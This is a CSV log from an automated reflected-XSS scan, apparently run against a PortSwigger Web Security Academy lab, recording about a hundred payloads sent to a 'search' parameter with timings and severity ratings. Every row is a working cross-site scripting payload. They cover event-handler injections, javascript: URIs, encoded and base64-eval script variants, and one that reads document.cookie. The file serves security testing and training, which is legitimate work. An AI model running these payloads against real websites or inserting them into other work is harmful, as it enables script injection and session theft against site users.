Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 16:00:13.692,2026-01-10 16:00:13.963,0.271,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,No,,High
2026-01-10 16:00:13.963,2026-01-10 16:00:14.145,0.182,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onerror=alert(document.cookie)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:14.145,2026-01-10 16:00:14.453,0.308,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img/src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:14.453,2026-01-10 16:00:14.763,0.310,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<img src=""x"" onerror=""alert(1)"">",RAW_REFLECTION,No,,High
2026-01-10 16:00:14.763,2026-01-10 16:00:15.084,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src='x' onerror='alert(1)'>,RAW_REFLECTION,No,,High
2026-01-10 16:00:15.084,2026-01-10 16:00:15.251,0.167,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<body onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:15.251,2026-01-10 16:00:15.562,0.311,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<body onpageshow=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:15.562,2026-01-10 16:00:15.729,0.166,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<body onfocus=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:15.729,2026-01-10 16:00:15.891,0.162,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<body onhashchange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:15.891,2026-01-10 16:00:16.056,0.166,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<body onload=prompt(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:16.057,2026-01-10 16:00:16.364,0.307,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<body onload=confirm(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:16.364,2026-01-10 16:00:16.527,0.163,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:00:16.527,2026-01-10 16:00:16.843,0.317,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input onblur=alert(1) autofocus><input>,RAW_REFLECTION,No,,High
2026-01-10 16:00:16.843,2026-01-10 16:00:17.163,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=text value=x onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:00:17.163,2026-01-10 16:00:17.483,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=button value=xss onclick=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:17.483,2026-01-10 16:00:17.807,0.324,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=image src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:17.807,2026-01-10 16:00:18.123,0.316,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<iframe src=javascript:alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:18.123,2026-01-10 16:00:18.443,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<iframe src=""javascript:alert(1)"">",RAW_REFLECTION,No,,High
2026-01-10 16:00:18.443,2026-01-10 16:00:18.762,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<iframe onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:18.762,2026-01-10 16:00:18.930,0.168,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<iframe/onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:18.930,2026-01-10 16:00:19.242,0.311,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<iframe  rc=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,No,,High
2026-01-10 16:00:19.242,2026-01-10 16:00:19.563,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,'-alert(1)-',RAW_REFLECTION,No,,High
2026-01-10 16:00:19.563,2026-01-10 16:00:19.748,0.186,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<details open ontoggle=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:19.748,2026-01-10 16:00:20.043,0.294,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<details ontoggle=alert(1)><summary>xss</summary></details>,RAW_REFLECTION,No,,High
2026-01-10 16:00:20.043,2026-01-10 16:00:20.366,0.324,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<details open ontoggle=prompt(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:20.366,2026-01-10 16:00:20.683,0.316,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<object data=javascript:alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:20.683,2026-01-10 16:00:21.007,0.324,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<embed src=javascript:alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:21.007,2026-01-10 16:00:21.303,0.297,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<object data=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,No,,High
2026-01-10 16:00:21.303,2026-01-10 16:00:21.510,0.206,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<select onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:00:21.510,2026-01-10 16:00:21.802,0.293,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<textarea onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:00:21.802,2026-01-10 16:00:22.126,0.324,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:00:22.126,2026-01-10 16:00:22.442,0.316,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<marquee onstart=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:22.442,2026-01-10 16:00:22.635,0.193,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<marquee loop=1 onfinish=alert(1)>x</marquee>,RAW_REFLECTION,No,,High
2026-01-10 16:00:22.635,2026-01-10 16:00:22.833,0.197,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<video src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:22.833,2026-01-10 16:00:23.085,0.252,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<audio src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:23.085,2026-01-10 16:00:23.295,0.210,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<video><source onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:23.295,2026-01-10 16:00:23.489,0.195,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<link rel=stylesheet href=javascript:alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:23.489,2026-01-10 16:00:23.721,0.231,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<a href=javascript:alert(1)>click</a>,RAW_REFLECTION,No,,High
2026-01-10 16:00:23.721,2026-01-10 16:00:24.049,0.328,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<a href=""javascript:alert(1)"">click</a>",RAW_REFLECTION,No,,High
2026-01-10 16:00:24.049,2026-01-10 16:00:24.360,0.311,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<form action=javascript:alert(1)><input type=submit>,RAW_REFLECTION,No,,High
2026-01-10 16:00:24.360,2026-01-10 16:00:24.682,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<form><button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,No,,High
2026-01-10 16:00:24.682,2026-01-10 16:00:25.001,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<form><input formaction=javascript:alert(1) type=submit value=X>,RAW_REFLECTION,No,,High
2026-01-10 16:00:25.001,2026-01-10 16:00:25.195,0.193,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<meta http-equiv=refresh content=0;url=javascript:alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:25.195,2026-01-10 16:00:25.392,0.198,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<meta http-equiv=refresh content=""0;javascript:alert(1)"">",RAW_REFLECTION,No,,High
2026-01-10 16:00:25.393,2026-01-10 16:00:25.640,0.248,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<style>*{background:url('javascript:alert(1)')}</style>,RAW_REFLECTION,No,,High
2026-01-10 16:00:25.640,2026-01-10 16:00:25.964,0.324,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<style>@import'javascript:alert(1)';</style>,RAW_REFLECTION,No,,High
2026-01-10 16:00:25.964,2026-01-10 16:00:26.152,0.188,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<style onload=alert(1)></style>,RAW_REFLECTION,No,,High
2026-01-10 16:00:26.152,2026-01-10 16:00:26.441,0.288,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<math><mi xlink:href=javascript:alert(1)>X</mi></math>,RAW_REFLECTION,No,,High
2026-01-10 16:00:26.441,2026-01-10 16:00:26.602,0.162,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<table background=javascript:alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:26.602,2026-01-10 16:00:26.921,0.318,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<table><td background=javascript:alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:26.921,2026-01-10 16:00:27.094,0.174,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<div onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:27.094,2026-01-10 16:00:27.401,0.306,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<div style=width:expression(alert(1))>,RAW_REFLECTION,No,,High
2026-01-10 16:00:27.401,2026-01-10 16:00:27.721,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert&#40;1&#41;</script>,RAW_REFLECTION,No,,High
2026-01-10 16:00:27.721,2026-01-10 16:00:28.040,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert&#x28;1&#x29;</script>,RAW_REFLECTION,No,,High
2026-01-10 16:00:28.041,2026-01-10 16:00:28.218,0.177,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>\u0061lert(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:00:28.218,2026-01-10 16:00:28.410,0.192,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,No,,High
2026-01-10 16:00:28.410,2026-01-10 16:00:28.631,0.221,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onabort=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:28.631,2026-01-10 16:00:28.839,0.208,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onactivate=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:28.839,2026-01-10 16:00:29.012,0.172,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onafterprint=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:29.012,2026-01-10 16:00:29.184,0.172,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onafterupdate=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:29.184,2026-01-10 16:00:29.480,0.296,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onbeforeactivate=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:29.480,2026-01-10 16:00:29.800,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onbeforecopy=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:29.800,2026-01-10 16:00:30.008,0.208,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onbeforecut=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:30.008,2026-01-10 16:00:30.280,0.272,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onbeforedeactivate=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:30.280,2026-01-10 16:00:30.451,0.171,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onbeforeeditfocus=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:30.451,2026-01-10 16:00:30.760,0.309,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onbeforepaste=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:30.760,2026-01-10 16:00:31.084,0.324,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onbeforeprint=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:31.084,2026-01-10 16:00:31.400,0.316,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onbeforeunload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:31.400,2026-01-10 16:00:31.724,0.324,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onbeforeupdate=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:31.724,2026-01-10 16:00:32.039,0.316,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onblur=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:32.039,2026-01-10 16:00:32.211,0.171,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onbounce=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:32.211,2026-01-10 16:00:32.389,0.178,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x oncellchange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:32.389,2026-01-10 16:00:32.680,0.291,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onchange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:32.680,2026-01-10 16:00:32.999,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onclick=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:32.999,2026-01-10 16:00:33.319,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x oncontextmenu=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:33.319,2026-01-10 16:00:33.639,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x oncontrolselect=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:33.639,2026-01-10 16:00:33.958,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x oncopy=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:33.958,2026-01-10 16:00:34.279,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x oncut=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:34.279,2026-01-10 16:00:34.599,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x ondataavailable=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:34.599,2026-01-10 16:00:34.919,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x ondatasetchanged=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:34.919,2026-01-10 16:00:35.211,0.291,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x ondatasetcomplete=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:35.211,2026-01-10 16:00:35.400,0.189,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x ondblclick=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:35.400,2026-01-10 16:00:35.719,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x ondeactivate=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:35.719,2026-01-10 16:00:36.039,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x ondrag=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:36.039,2026-01-10 16:00:36.236,0.197,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x ondragend=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:36.236,2026-01-10 16:00:36.500,0.265,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x ondragenter=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:36.500,2026-01-10 16:00:36.707,0.206,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x ondragleave=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:36.707,2026-01-10 16:00:36.999,0.292,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x ondragover=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:36.999,2026-01-10 16:00:37.318,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x ondragstart=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:37.318,2026-01-10 16:00:37.478,0.160,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x ondrop=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:37.478,2026-01-10 16:00:37.799,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:37.799,2026-01-10 16:00:37.958,0.159,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onerrorupdate=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:37.958,2026-01-10 16:00:38.132,0.175,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onfilterchange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:38.133,2026-01-10 16:00:38.439,0.306,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onfinish=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:38.439,2026-01-10 16:00:38.759,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onfocus=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:38.759,2026-01-10 16:00:39.079,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onfocusin=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:39.079,2026-01-10 16:00:39.398,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onfocusout=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:39.398,2026-01-10 16:00:39.718,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onhelp=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:39.718,2026-01-10 16:00:40.042,0.324,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x oninput=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:40.042,2026-01-10 16:00:40.240,0.197,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onkeydown=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:40.240,2026-01-10 16:00:40.517,0.278,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onkeypress=alert(1)>,RAW_REFLECTION,No,,High
